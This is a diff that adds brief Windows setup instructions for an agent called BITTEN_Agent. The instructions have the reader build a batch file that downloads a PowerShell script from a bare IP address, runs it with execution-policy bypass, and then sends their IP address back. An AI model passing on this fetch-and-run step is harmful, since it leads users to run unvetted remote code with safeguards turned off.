@@ -1,0 +1,27 @@
+SUPER EASY WINDOWS SETUP - COPY THIS TO NOTEPAD
+==============================================
+
+Step 1: In PowerShell, type ONLY this:
+
+notepad setup.bat
+
+Step 2: In Notepad, type these 4 lines:
+
+@echo off
+powershell -c "iwr http://134.199.204.67:9999/QUICK_AGENT_SETUP.ps1 -o s.ps1"
+powershell -ep bypass .\s.ps1
+pause
+
+Step 3: Save and close Notepad
+
+Step 4: Type:
+
+setup.bat
+
+That's it! The agent will install.
+
+When done, type:
+cd C:\BITTEN_Agent
+python agent.py
+
+Then tell me your Windows IP address.
